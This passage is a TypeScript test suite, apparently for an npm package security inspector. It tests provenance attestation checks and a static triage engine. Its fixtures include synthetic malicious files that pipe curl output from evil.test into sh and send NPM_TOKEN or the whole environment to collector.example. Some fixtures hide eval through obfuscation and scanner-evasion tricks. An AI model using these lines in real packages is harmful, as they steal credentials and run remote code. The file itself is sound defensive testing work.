    // 5. Mismatched package identity in SLSA subject -> CRITICAL PROVENANCE_DIGEST_MISMATCH
    const badPkgAtt = buildTestNpmSlsaAttestation({
      packageName: "prov-cli",
      version: "1.2.3",
      tarballSha512Sri: sha512,
      overrideSubjectName: "pkg:npm/other-pkg@1.2.3",
    });
    const badPkgInsp = verifyNpmAttestationPayload(badPkgAtt, sha512, "prov-cli");
    assert.equal(badPkgInsp.status, "verification_failed");
    assert.ok(badPkgInsp.observations.some((o) => o.code === "PROVENANCE_DIGEST_MISMATCH"));

    // 6. Live local HTTP CLI E2E with real leaf-signed attestation endpoint AND tampered attestation endpoint
    const workDir = mkdtempSync(join(tmpdir(), "coldpin-prov-http-"));
    let serveTampered = false;
    const srv = createServer((req, res) => {
      const url = new URL(req.url ?? "/", "http://127.0.0.1");
      const base = `http://127.0.0.1:${(srv.address() as AddressInfo).port}`;
      const oldDate = new Date(Date.now() - 30 * 24 * 3600 * 1000).toISOString();
      if (url.pathname === "/prov-cli") {
        res.writeHead(200, { "content-type": "application/json" });
        res.end(
          JSON.stringify({
            name: "prov-cli",
            "dist-tags": { latest: "1.2.3" },
            time: { created: oldDate, "1.2.3": oldDate },
            versions: {
              "1.2.3": {
                name: "prov-cli",
                version: "1.2.3",
                license: "MIT",
                bin: { prov: "./cli.js" },
                dist: { tarball: `${base}/prov.tgz`, integrity: sha512, attestations: { url: `${base}/att` } },
              },
            },
          }),
        );
        return;
      }
      if (url.pathname === "/prov.tgz") {
        res.writeHead(200, { "content-type": "application/octet-stream", "content-length": String(cleanTgz.length) });
        res.end(cleanTgz);
        return;
      }
      if (url.pathname === "/att") {
        res.writeHead(200, { "content-type": "application/json" });
        res.end(JSON.stringify(serveTampered ? badDigestAtt : validAtt));
        return;
      }
      if (req.method === "POST" && url.pathname === "/v1/querybatch") {
        res.writeHead(200, { "content-type": "application/json" });
        res.end(JSON.stringify({ results: [{ vulns: [] }] }));
        return;
      }
      res.writeHead(404);
      res.end();
    });
    await new Promise<void>((r) => srv.listen(0, "127.0.0.1", () => r()));
    const port = (srv.address() as AddressInfo).port;
    const polPath = join(workDir, "policy.json");
    const strictPolPath = join(workDir, "strict-policy.json");
    writeFileSync(polPath, JSON.stringify({ default_registry: `http://127.0.0.1:${port}`, osv_api_url: `http://127.0.0.1:${port}` }));
    writeFileSync(
      strictPolPath,
      JSON.stringify({ default_registry: `http://127.0.0.1:${port}`, osv_api_url: `http://127.0.0.1:${port}`, require_provenance: true }),
    );
    const cliPath = resolve("src/cli.ts");
    const runCli = (args: string[]) =>
      new Promise<{ code: number; stdout: string; stderr: string }>((res) => {
        const p = spawn(process.execPath, ["--no-warnings", cliPath, ...args]);
        let stdout = "";
        let stderr = "";
        p.stdout.on("data", (d) => (stdout += String(d)));
        p.stderr.on("data", (d) => (stderr += String(d)));
        p.on("close", (code) => res({ code: code ?? 1, stdout, stderr }));
      });

    try {
      // Default policy: valid leaf-signed DSSE succeeds with honest dsse_leaf_verified_unanchored (provenance_attested=false)
      const rDefault = await runCli(["inspect", "--json", "prov-cli@1.2.3", "--policy", polPath, "--cache-dir", ":memory:"]);
      assert.equal(rDefault.code, 0, rDefault.stderr);
      const jDefault = JSON.parse(rDefault.stdout) as { info: { parity_tier: string; provenance_status: string; provenance_attested: boolean } };
      assert.equal(jDefault.info.parity_tier, "PROVENANCE_UNANCHORED_DSSE");
      assert.equal(jDefault.info.provenance_status, "dsse_leaf_verified_unanchored");
      assert.equal(jDefault.info.provenance_attested, false);

      // Strict require_provenance=true: unanchored leaf DSSE fails closed (exit 2 UNVERIFIABLE_UNKNOWN)
      const rStrict = await runCli(["inspect", "--json", "prov-cli@1.2.3", "--policy", strictPolPath, "--cache-dir", ":memory:"]);
      assert.equal(rStrict.code, 2, rStrict.stderr);
      const jStrict = JSON.parse(rStrict.stdout) as { verdict: string };
      assert.equal(jStrict.verdict, "UNVERIFIABLE_UNKNOWN");

      // Tampered SLSA subject digest: fails hard with exit 3 MALICIOUS_INDICATORS_FOUND
      serveTampered = true;
      const rTamper = await runCli(["inspect", "--json", "prov-cli@1.2.3", "--policy", polPath, "--cache-dir", ":memory:"]);
      assert.equal(rTamper.code, 3, rTamper.stderr);
      const jTamper = JSON.parse(rTamper.stdout) as { verdict: string };
      assert.equal(jTamper.verdict, "MALICIOUS_INDICATORS_FOUND");
    } finally {
      srv.close();
      rmSync(workDir, { recursive: true, force: true });
    }
  });

  it("closes ASI/semicolon-free, optional-chaining, indirect/.call/.apply/.bind, createRequire, string-concat/reverse, barrel re-export, benign FP, strict PURL/version/private-provenance, require_provenance resolve-anchor, and packager negative-link gates", async () => {
    // 1. Adversarial ASI/semicolon-free, optional-chaining, indirect calls, .call/.apply/.bind, createRequire, string concat/reverse, Function.prototype.constructor, barrel re-export
    const advTgz = buildSyntheticTgz([
      { name: "package/package.json", content: JSON.stringify({ name: "r2-audit-evasions", version: "1.0.0", license: "MIT" }) },
      { name: "package/asi-eval.js", content: 'const runCode = eval\nrunCode("1+1")' },
      { name: "package/asi-cp.js", content: 'import { execSync } from "node:child_process"\nconst cmd = "curl https://evil.test/s | sh"\nexecSync(cmd)' },
      { name: "package/asi-proc.js", content: 'const p = process\nfetch("https://collector.example/p", { body: JSON.stringify(p.env) })' },
      { name: "package/asi-bracket.js", content: 'const a = "ev"\nconst b = "al"\nconst fn = a + b\nglobalThis[fn]("1+1")' },
      { name: "package/indirect-fn.js", content: '(0, Function)("return 1")();' },
      { name: "package/indirect-cp.js", content: 'import { execSync } from "node:child_process"; (0, execSync)("curl https://evil.test/s | sh");' },
      { name: "package/indirect-fetch.js", content: '(0, fetch)("https://collector.example/f", { body: process.env.NPM_TOKEN });' },
      { name: "package/opt-chain.js", content: 'const x = process?.env?.NPM_TOKEN; fetch("https://collector.example/o", { body: x });' },
      { name: "package/create-req.js", content: 'import { createRequire } from "node:module"; const req = createRequire(import.meta.url); const { execSync: run } = req("node:child_process"); run("curl https://evil.test/r.sh | sh");' },
      { name: "package/dot-call-eval.js", content: 'eval.call(null, "1+1");' },
      { name: "package/dot-apply-cp.js", content: 'import { execSync } from "node:child_process"; execSync.apply(null, ["curl https://evil.test/s | sh"]);' },
      { name: "package/dot-call-fetch.js", content: 'fetch.call(globalThis, "https://collector.example/c", { body: process.env.NPM_TOKEN });' },
      { name: "package/dot-bind-eval.js", content: 'const bound = eval.bind(null); bound("1+1");' },
      { name: "package/proto-ctor.js", content: 'Function.prototype.constructor("return 1")();' },
      { name: "package/rev-join.js", content: 'globalThis[["l", "a", "v", "e"].reverse().join("")]("1+1");' },
      { name: "package/split-rev.js", content: 'globalThis["lave".split("").reverse().join("")]("1+1");' },
      { name: "package/sink.js", content: 'export function sendOut(v) { return fetch("https://collector.example/b", { body: v }); }' },
      { name: "package/barrel.js", content: 'export { sendOut } from "./sink.js";' },
      { name: "package/caller.js", content: 'import { sendOut } from "./barrel.js"; sendOut(process.env.NPM_TOKEN);' },
    ]);
    const advUnpack = await unpackTarballInMemory(advTgz, DEFAULT_POLICY);
    const advTriage = triageUnpackedEntries(advUnpack.entries, DEFAULT_POLICY);
    const codes = (f: string) => new Set(advTriage.observations.filter((o) => o.path === f).map((o) => o.code));

    assert.ok(codes("asi-eval.js").has("OBFUSCATED_DYNAMIC_EXEC"));
    assert.ok(codes("asi-cp.js").has("CHILD_PROCESS_DANGEROUS_EXEC"));
    assert.ok(codes("asi-proc.js").has("ENV_SERIALIZATION_EXFIL"));
    assert.ok(codes("asi-bracket.js").has("OBFUSCATED_DYNAMIC_EXEC"));
    assert.ok(codes("indirect-fn.js").has("OBFUSCATED_DYNAMIC_EXEC"));
    assert.ok(codes("indirect-cp.js").has("CHILD_PROCESS_DANGEROUS_EXEC"));
    assert.ok(codes("indirect-fetch.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"));
    assert.ok(codes("opt-chain.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"));
    assert.ok(codes("create-req.js").has("CHILD_PROCESS_DANGEROUS_EXEC"));
    assert.ok(codes("dot-call-eval.js").has("OBFUSCATED_DYNAMIC_EXEC"));
    assert.ok(codes("dot-apply-cp.js").has("CHILD_PROCESS_DANGEROUS_EXEC"));
    assert.ok(codes("dot-call-fetch.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"));
    assert.ok(codes("dot-bind-eval.js").has("OBFUSCATED_DYNAMIC_EXEC"));
    assert.ok(codes("proto-ctor.js").has("OBFUSCATED_DYNAMIC_EXEC"));
    assert.ok(codes("rev-join.js").has("OBFUSCATED_DYNAMIC_EXEC"));
    assert.ok(codes("split-rev.js").has("OBFUSCATED_DYNAMIC_EXEC"));
    assert.ok(codes("caller.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "barrel re-export chain must propagate exported sinks");

    // 2. Benign FP fixes: array literal ["eval"], RegExp variable re.exec(process.env.CUSTOM), class method import(x) {}
    const fpTgz = buildSyntheticTgz([
      { name: "package/package.json", content: JSON.stringify({ name: "benign-fp-guards", version: "1.0.0", license: "MIT" }) },
      {
        name: "package/index.js",
        content: `
          const reserved = ["eval"];
          const nested = [["Function"]];
          const re = /^prod/;
          const re2 = new RegExp("^dev");
          const m1 = re.exec(process.env.MY_CUSTOM_MODE || "");
          const m2 = re2.exec(process.env.MY_CUSTOM_MODE || "");
          class PluginLoader { import(x) { return x; } }
          console.log(reserved, nested, m1, m2, new PluginLoader().import("ok"));
        `,
      },
    ]);
    const fpUnpack = await unpackTarballInMemory(fpTgz, DEFAULT_POLICY);
    const fpTriage = triageUnpackedEntries(fpUnpack.entries, DEFAULT_POLICY);
    assert.equal(fpTriage.observations.length, 0, `Unexpected benign FPs: ${JSON.stringify(fpTriage.observations)}`);

    // 3. Strict npm provenance: non-PURL name, missing name, wrong version, private-scope fetch suppression, early-return parity status preservation
    const sha = computeSha512Integrity(fpTgz);
    const nonPurl = buildTestNpmSlsaAttestation({ packageName: "prov-cli", version: "1.2.3", tarballSha512Sri: sha, overrideSubjectName: "not-a-purl" });
    assert.equal(verifyNpmAttestationPayload(nonPurl, sha, "prov-cli", undefined, "1.2.3").status, "verification_failed");
    const wrongVer = buildTestNpmSlsaAttestation({ packageName: "prov-cli", version: "9.9.9", tarballSha512Sri: sha });
    assert.equal(verifyNpmAttestationPayload(wrongVer, sha, "prov-cli", undefined, "1.2.3").status, "verification_failed");
    const privAtt = await inspectNpmAttestationBundle({
      attestationUrl: "https://registry.npmjs.org/-/npm/v1/attestations/@acme%2Fsecret@1.0.0",
      expectedTarballSha512: sha,
      expectedPackageName: "@acme/secret",
      expectedPackageVersion: "1.0.0",
      route: "private",
      allowedAuthOrigin: "https://artifactory.acme.internal",
    });
    assert.equal(privAtt.status, "metadata_url_only");
    assert.ok(privAtt.unknowns.some((u) => u.startsWith("PRIVATE_SCOPE_PROVENANCE_FETCH_SUPPRESSED")));

    const earlyParity = await verifyTarballVsGitParity({
      tarballManifest: null,
      tarballEntries: fpUnpack.entries,
      provenanceAttested: false,
      provenanceStatus: "verification_failed",
      provenanceUrl: "https://registry.npmjs.org/att",
      localGitDir: resolve("."),
    });
    assert.equal(earlyParity.provenance_status, "verification_failed");
    assert.equal(earlyParity.tier, "TARBALL_SOURCE_DRIFT");

    // 4. resolve-anchor under require_provenance=true MUST suppress commands when release lacks Sigstore verification
    const tmpRepo = mkdtempSync(join(tmpdir(), "coldpin-prov-anchor-"));
    try {
      const git = (a: string[]) => execFileSync("git", a, { cwd: tmpRepo, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).trim();
      git(["init", "-b", "main"]);
      git(["config", "user.name", "T"]);
      git(["config", "user.email", "t@e.com"]);
      writeFileSync(join(tmpRepo, "package.json"), JSON.stringify({ name: "strict-anchor", version: "1.0.0", license: "MIT", bin: { sa: "./cli.js" } }));
      writeFileSync(join(tmpRepo, "cli.js"), "console.log('clean');\n");
      git(["add", "."]);
      git(["commit", "-m", "v1 clean"]);
      const c1 = git(["rev-parse", "HEAD"]);

      const strictHead = await walkGitHistoryForCleanAnchor({
        package_name: "strict-anchor",
        repoUrlOrLocalPath: tmpRepo,
        isLocalDir: true,
        policy: { ...DEFAULT_POLICY, require_provenance: true },
        releaseTarballByCommit: new Map([[c1, { version: "1.0.0", tarball_sha512: sha, provenance_attested: false, provenance_status: "dsse_leaf_verified_unanchored" }]]),
      });
      assert.equal(strictHead.recommended_action, "BLOCK_NO_SAFE_PATH");
      assert.equal(strictHead.safe_anchor?.pinned_execution.command, null);
      assert.ok(strictHead.unknowns.some((u) => u.startsWith("PROVENANCE_REQUIRED_NOT_VERIFIED")));
      const anchorMd = formatAnchorMarkdown(strictHead);
      assert.ok(anchorMd.includes("dsse_leaf_verified_unanchored") && anchorMd.includes("sigstore_verified=`false`"));
    } finally {
      rmSync(tmpRepo, { recursive: true, force: true });
    }

    // 5. Negative packager validation test: pack_plugin.py validate_archive_contents MUST catch broken relative links, broken #anchors, and missing openai.yaml icon
    const negOut = execFileSync(
      "python",
      [
        "-B",
        "-c",
        [
          "import sys; sys.path.insert(0, 'scripts'); import pack_plugin as pp",
          "items = pp.collect_target_files('openai')",
          "fb = {arc: pp.render_archive_bytes(arc, p) for arc, p in items}",
          "assert pp.validate_archive_contents('openai', fb) == []",
          "fb_link = dict(fb); fb_link['docs/designs/SITEMAP.md'] = b'[broken](nope.md)\\n'",
          "e1 = pp.validate_archive_contents('openai', fb_link); assert any('broken packaged relative link' in e for e in e1)",
          "fb_anc = dict(fb); fb_anc['README.md'] = fb['README.md'] + b'\\n[bad](#does-not-exist)\\n'",
          "e2 = pp.validate_archive_contents('openai', fb_anc); assert any('broken packaged in-page anchor' in e for e in e2)",
          "fb_oy = dict(fb); fb_oy['skills/coldpin/agents/openai.yaml'] = b'icon_small: ./assets/missing.svg\\n'",
          "e3 = pp.validate_archive_contents('openai', fb_oy); assert any('missing icon' in e for e in e3)",
          "print('NEGATIVE_PACK_OK')",
        ].join("; "),
      ],
      { encoding: "utf8" },
    );
    assert.ok(negOut.includes("NEGATIVE_PACK_OK"));
  });

  it("enforces lexical taint scoping, parameter shadowing, clean-redeclaration kill, benign env-alias reads, non-regex Unicode RegExp tolerance, dense escape detection, and CLI --version/-V", async () => {
    // 1. Esbuild-style bundled file (prettier@3.5.3 regression):
    //    Module A reads `var env2 = process.env;` + benign color/debug/npm vars + local tainted `url2`,
    //    and top-level also declares tainted `url2` & `specifier`; Module B shadows params & cleanly re-declares `url2`.
    //    MUST NOT emit TAINT_CRED_TO_NETWORK_OR_EXEC (dynamic import(url2) emits HIGH OBFUSCATED_DYNAMIC_EXEC -> QUARANTINE_SUSPICIOUS, NOT MALICIOUS_INDICATORS_FOUND).
    const esbuildBundleTgz = buildSyntheticTgz([
      { name: "package/package.json", content: JSON.stringify({ name: "bundled-parser-cli", version: "3.5.3", license: "MIT" }) },
      {
        name: "package/index.mjs",
        content: `
          var __commonJS = (cb, mod) => () => (mod || cb((mod = { exports: {} }).exports, mod), mod.exports);
          var require_supports_color = __commonJS({
            "node_modules/supports-color/index.js"(exports, module) {
              var env2 = process.env;
              const c = env2.FORCE_COLOR || env2.NO_COLOR || env2.TERM || env2.COLORTERM || env2.NODE_DEBUG || env2.npm_package_name || env2.npm_lifecycle_script;
              const hasNoColor = "NO_COLOR" in env2;
              const guarded = env2 && env2.FORCE_COLOR;
              var url2 = env2.CUSTOM_INTERNAL_ENDPOINT;
              var parent = env2.CUSTOM_PARENT_VAL;
              module.exports = { c, hasNoColor, guarded, url2, parent };
            }
          });
          var url2 = process.env.OUTER_SENSITIVE_URL, specifier = process.env.OUTER_SPEC;
          function resolve2(s, p) { return s + p; }
          function pathToFileURL4(p) { return { href: "file://" + p }; }
          function importFromFile(specifier, parent) {
            const url2 = resolve2(specifier, pathToFileURL4(parent).href);
            return import(url2);
          }
          export { require_supports_color, importFromFile };
        `,
      },
    ]);
    const esUnpack = await unpackTarballInMemory(esbuildBundleTgz, DEFAULT_POLICY);
    const esTriage = triageUnpackedEntries(esUnpack.entries, DEFAULT_POLICY);
    assert.equal(
      esTriage.observations.some((o) => o.code === "TAINT_CRED_TO_NETWORK_OR_EXEC"),
      false,
      `Bundled importFromFile must NOT emit TAINT_CRED_TO_NETWORK_OR_EXEC: ${JSON.stringify(esTriage.observations)}`,
    );
    assert.ok(
      esTriage.observations.some((o) => o.code === "OBFUSCATED_DYNAMIC_EXEC" && o.severity === "HIGH"),
      "Computed import(url2) should still emit HIGH OBFUSCATED_DYNAMIC_EXEC",
    );
    const esReport = assembleInspectionReport({
      package_name: "bundled-parser-cli",
      version: "3.5.3",
      org_or_scope: "unscoped",
      creator: "dev",
      category_tags: [],
      summary: "bundled parser",
      license: "MIT",
      bin_names: [],
      unpack: esUnpack,
      triage: esTriage,
      parity: { tier: "PROVENANCE_ATTESTED", provenance_attested: true, observations: [], unknowns: [] },
      advisories: [],
      registryObservations: [],
      registryUnknowns: [],
      policy: DEFAULT_POLICY,
      host_capabilities: DUMMY_CAPS,
      cwd: tmpdir(),
    });
    assert.equal(esReport.verdict, "QUARANTINE_SUSPICIOUS");

    // 2. Closure-captured taint, shadowed-param negative vs positive, clean re-declaration, branch-launder resistance,
    //    try-block outer taint propagation, comma-list non-bleeding, and env-alias benign vs sensitive reads.
    const scopeMatrixTgz = buildSyntheticTgz([
      { name: "package/package.json", content: JSON.stringify({ name: "scope-matrix", version: "1.0.0", license: "MIT" }) },
      // Positive: genuine closure-captured taint MUST STILL emit CRITICAL TAINT_CRED_TO_NETWORK_OR_EXEC
      {
        name: "package/pos-closure.js",
        content: 'const tok = process.env.NPM_TOKEN; function send() { fetch("https://collector.example", { body: tok }); } send();',
      },
      // Positive: shadowed param wrapper called with tainted outer var MUST STILL emit CRITICAL
      {
        name: "package/pos-shadow-wrapper-call.js",
        content: 'const tok = process.env.NPM_TOKEN; function send(tok) { fetch("https://collector.example", { body: tok }); } send(tok);',
      },
      // Positive: sensitive property off env alias MUST STILL emit CRITICAL
      {
        name: "package/pos-env-alias-secret.js",
        content: 'var env2 = process.env; const s = env2.NPM_TOKEN; fetch("https://collector.example", { body: s });',
      },
      // Positive: whole env alias passed directly to sink MUST STILL emit CRITICAL
      {
        name: "package/pos-env-alias-whole.js",
        content: 'var env2 = process.env; fetch("https://collector.example", { body: env2 });',
      },
      // Positive: conditional branch clean reassignment MUST NOT launder outer taint
      {
        name: "package/pos-branch-launder.js",
        content: 'let tok = process.env.NPM_TOKEN; if (false) { tok = "clean"; } fetch("https://collector.example", { body: tok });',
      },
      // Positive: try-block reassignment to outer declared var MUST propagate taint after try exits
      {
        name: "package/pos-try-outer-reassign.js",
        content: 'let stolen = ""; try { stolen = process.env.NPM_TOKEN; } catch {} fetch("https://collector.example", { body: stolen });',
      },
      // Positive: block-scoped clean shadow MUST restore outer tainted var after block closes
      {
        name: "package/pos-block-restore.js",
        content: 'const tok = process.env.NPM_TOKEN; { const tok = "clean"; console.log(tok); } fetch("https://collector.example", { body: tok });',
      },
      // Negative: shadowed function param called with clean value MUST NOT emit taint
      {
        name: "package/neg-shadow-param.js",
        content: 'const tok = process.env.NPM_TOKEN; function send(tok) { fetch("https://registry.npmjs.org", { body: tok }); } send("ok");',
      },
      // Negative: expression-body arrow shadowed param called cleanly MUST NOT emit taint
      {
        name: "package/neg-arrow-shadow.js",
        content: 'const tok = process.env.NPM_TOKEN; const ping = (tok) => fetch("https://registry.npmjs.org", { body: tok }); ping("ok");',
      },
      // Negative: clean re-declaration / same-scope clean reassignment kills prior taint
      {
        name: "package/neg-clean-redecl.js",
        content: 'let x = process.env.NPM_TOKEN; x = "clean"; fetch("https://registry.npmjs.org", { body: x }); { const tok = process.env.NPM_TOKEN; } const tok = "safe"; fetch("https://registry.npmjs.org", { body: tok });',
      },
      // Negative: benign env alias reads + comma-list non-bleeding MUST NOT emit taint
      {
        name: "package/neg-benign-env-alias.js",
        content: 'var cleanA = "ok", env2 = process.env; const c = env2.NO_COLOR || env2.FORCE_COLOR || env2.NODE_DEBUG || env2.npm_package_name || env2.npm_lifecycle_script; fetch("https://registry.npmjs.org", { headers: { a: cleanA, c } });',
      },
      // Positive: destructuring defaults, nested RHS object/array literals, comma destructuring, nested env, globalThis.process
      {
        name: "package/pos-destr-default.js",
        content: 'const { tok = process.env.NPM_TOKEN } = {}; fetch("https://collector.example", { body: tok });',
      },
      {
        name: "package/pos-destr-arr-default.js",
        content: 'const [tok = process.env.NPM_TOKEN] = []; fetch("https://collector.example", { body: tok });',
      },
      {
        name: "package/pos-destr-rhs-multi.js",
        content: 'const s = process.env.NPM_TOKEN; const { a, b } = { a: "safe", b: s }; fetch("https://collector.example", { body: b });',
      },
      {
        name: "package/pos-destr-arr-multi.js",
        content: 'const s = process.env.NPM_TOKEN; const [a, b] = ["safe", s]; fetch("https://collector.example", { body: b });',
      },
      {
        name: "package/pos-comma-destr.js",
        content: 'var a = 1, { NPM_TOKEN } = process.env; fetch("https://collector.example", { body: NPM_TOKEN });',
      },
      {
        name: "package/pos-globalthis-destr.js",
        content: 'const { env: { NPM_TOKEN } } = globalThis.process; fetch("https://collector.example", { body: NPM_TOKEN });',
      },
      // Positive: conditional / braceless / short-circuit clean reassignment MUST NOT launder taint
      {
        name: "package/pos-braceless-launder.js",
        content: 'let tok = process.env.NPM_TOKEN; if (false) tok = "clean"; fetch("https://collector.example", { body: tok });',
      },
      {
        name: "package/pos-shortcircuit-launder.js",
        content: 'let tok = process.env.NPM_TOKEN; false && (tok = "clean"); fetch("https://collector.example", { body: tok });',
      },
      // Positive: regex-vs-division evasion (`x++ / 2`, `o.return / 2`) & leading-zero \u{000000000061} escape
      {
        name: "package/pos-div-evasion.js",
        content: 'let x = 1; x++ / 2; fetch("https://collector.example", { body: process.env.NPM_TOKEN }); // /',
      },
      {
        name: "package/pos-prop-div-evasion.js",
        content: 'const o = { return: 4 }; o.return / 2; fetch("https://collector.example", { body: process.env.NPM_TOKEN }); // /',
      },
      {
        name: "package/pos-leading-zero-uni.js",
        content: 'ev\\u{000000000061}l("1+1");',
      },
      // Positive: var block arrow inside if-block returning taint
      {
        name: "package/pos-var-block-arrow.js",
        content: 'if (true) { var getT = () => { return process.env.NPM_TOKEN; }; } fetch("https://collector.example", { body: getT() });',
      },
      // Negative: block-body arrow / function expression / chained arrow parameter colliding with outer tainted var
      {
        name: "package/neg-fn-expr-param.js",
        content: 'const url2 = process.env.CUSTOM_URL; const r1 = (url2) => { return "/safe/" + url2; }; const r2 = function(url2) { return "/safe/" + url2; }; const r3 = (a) => (url2) => "/safe/" + url2; fetch("https://registry.npmjs.org", { body: r1("a") + r2("b") + r3("c")("d") });',
      },
      // Negative: object literal property keys colliding with env alias / tainted var, dynamic env[k] stringify, nested comma decl, braceless for-let, and module-scoped wrapper sinks
      {
        name: "package/neg-obj-key-and-scoped-wrappers.js",
        content: 'var env = process.env; var path = process.env.CUSTOM_PATH; const cfg = { path: "/clean" }; fetch("https://registry.npmjs.org", { headers: { env: "prod" }, body: cfg }); const s1 = JSON.stringify({ env: "prod" }); const s2 = JSON.stringify(env && env.NO_COLOR); function d(k) { const v = env[k]; return JSON.stringify(v); } for (let tok = process.env.CUSTOM_X; false; ) console.log(tok); const fn = () => fetch("https://registry.npmjs.org", { body: tok }); var mA = __cjs({ "a.js"() { function send(x) { return fetch("https://a.example", { body: x }); } } }); var mB = __cjs({ "b.js"() { function send(x) { return console.log(x); } const s = process.env.CUSTOM_LOG; send(s); } });',
      },
    ]);
    const smUnpack = await unpackTarballInMemory(scopeMatrixTgz, DEFAULT_POLICY);
    const smTriage = triageUnpackedEntries(smUnpack.entries, DEFAULT_POLICY);
    const smCodes = (f: string) => new Set(smTriage.observations.filter((o) => o.path === f).map((o) => o.code));

    assert.ok(smCodes("pos-closure.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "closure-captured taint must be caught");
    assert.ok(smCodes("pos-shadow-wrapper-call.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "wrapper call with tainted outer arg must be caught");
    assert.ok(smCodes("pos-env-alias-secret.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "env2.NPM_TOKEN must be caught");
    assert.ok(smCodes("pos-env-alias-whole.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "whole env2 in sink must be caught");
    assert.ok(smCodes("pos-branch-launder.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "if (false) launder must not kill outer taint");
    assert.ok(smCodes("pos-try-outer-reassign.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "try-block taint assignment to outer let must be caught");
    assert.ok(smCodes("pos-block-restore.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "outer taint must survive after inner block shadow pops");
    assert.ok(smCodes("pos-destr-default.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "object destructuring default taint must be caught");
    assert.ok(smCodes("pos-destr-arr-default.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "array destructuring default taint must be caught");
    assert.ok(smCodes("pos-destr-rhs-multi.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "multi-prop object destructuring RHS taint must be caught");
    assert.ok(smCodes("pos-destr-arr-multi.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "multi-elem array destructuring RHS taint must be caught");
    assert.ok(smCodes("pos-comma-destr.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "comma-list destructuring taint must be caught");
    assert.ok(smCodes("pos-globalthis-destr.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "globalThis.process nested env destructuring must be caught");
    assert.ok(smCodes("pos-braceless-launder.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "braceless if (false) tok = clean must not launder taint");
    assert.ok(smCodes("pos-shortcircuit-launder.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "short-circuit false && (tok = clean) must not launder taint");
    assert.ok(smCodes("pos-div-evasion.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "x++ / 2 must not swallow rest of line as regex");
    assert.ok(smCodes("pos-prop-div-evasion.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "o.return / 2 must not swallow rest of line as regex");
    assert.ok(smCodes("pos-leading-zero-uni.js").has("OBFUSCATED_DYNAMIC_EXEC"), "leading-zero \\u{000000000061} escape must be decoded");
    assert.ok(smCodes("pos-var-block-arrow.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "var block arrow inside if-block returning taint must be caught");

    assert.equal(smCodes("neg-shadow-param.js").size, 0, "shadowed param with clean call must have 0 findings");
    assert.equal(smCodes("neg-arrow-shadow.js").size, 0, "arrow shadowed param with clean call must have 0 findings");
    assert.equal(smCodes("neg-clean-redecl.js").size, 0, "same-scope clean reassignment / block exit must have 0 findings");
    assert.equal(smCodes("neg-benign-env-alias.js").size, 0, "benign env alias props + comma decl must have 0 findings");
    assert.equal(smCodes("neg-fn-expr-param.js").size, 0, "block-body arrow / function expr / chained arrow param shadowing must have 0 findings");
    assert.equal(smCodes("neg-obj-key-and-scoped-wrappers.js").size, 0, "object keys, dynamic env[k] stringify, braceless for-let, and module-scoped wrapper sinks must have 0 findings");

    // 3. Unicode RegExp parser table (220+ \uXXXX inside regex literals, incl. after `if (s)` and `{}` blocks -> VERIFIED_CLEAN_WITHIN_SCOPE)
    //    vs dense \xXX / \uXXXX obfuscated string payloads (including comment-padded evasion -> HIGH_ENTROPY_OBFUSCATION)
    const uniRanges = Array.from({ length: 120 }, (_, idx) => {
      const a = (0x00c0 + idx * 4).toString(16).padStart(4, "0");
      const b = (0x00c0 + idx * 4 + 2).toString(16).padStart(4, "0");
      return `\\u${a}-\\u${b}`;
    }).join("");
    const parserCode = [
      `const UNI_RE = /[${uniRanges}]/u;`,
      `const UNI_RE2 = /[${uniRanges}]/g;`,
      `export function checkMinified(s) { if (s) /[${uniRanges}]/u.test(s); if (s) { s = s.trim(); } /[${uniRanges}]/u.test(s); return s; }`,
      ...Array.from({ length: 40 }, (_, i) => `export function parseNode${i}(src) { return UNI_RE.test(src) ? src.replace(UNI_RE2, "") : src; }`),
    ].join("\n");
    const benignParserTgz = buildSyntheticTgz([
      { name: "package/package.json", content: JSON.stringify({ name: "unicode-parser-cli", version: "1.0.0", license: "MIT" }) },
      { name: "package/parser.js", content: parserCode },
    ]);
    const bpUnpack = await unpackTarballInMemory(benignParserTgz, DEFAULT_POLICY);
    const bpTriage = triageUnpackedEntries(bpUnpack.entries, DEFAULT_POLICY);
    assert.equal(bpTriage.observations.length, 0, `Unicode RegExp parser must have 0 findings: ${JSON.stringify(bpTriage.observations)}`);
    assert.equal(bpTriage.has_obfuscation, false);

    const denseHexStr = Array.from({ length: 90 }, (_, i) => `\\x${(65 + (i % 26)).toString(16)}`).join("");
    const denseUniStr = Array.from({ length: 90 }, (_, i) => `\\u${(65 + (i % 26)).toString(16).padStart(4, "0")}`).join("");
    const obfEscTgz = buildSyntheticTgz([
      { name: "package/package.json", content: JSON.stringify({ name: "esc-obf-pkg", version: "1.0.0", license: "MIT" }) },
      { name: "package/hex-str.js", content: `${"// ".concat("a".repeat(80), "\n").repeat(80)}const p = "${denseHexStr}"; console.log(p);` },
      { name: "package/uni-str.js", content: `const u = "${denseUniStr}"; console.log(u);` },
    ]);
    const oeUnpack = await unpackTarballInMemory(obfEscTgz, DEFAULT_POLICY);
    const oeTriage = triageUnpackedEntries(oeUnpack.entries, DEFAULT_POLICY);
    assert.ok(
      oeTriage.observations.some((o) => o.path === "hex-str.js" && o.code === "HIGH_ENTROPY_OBFUSCATION"),
      "Comment-padded dense \\xHH string payload must still trigger HIGH_ENTROPY_OBFUSCATION",
    );
    assert.ok(
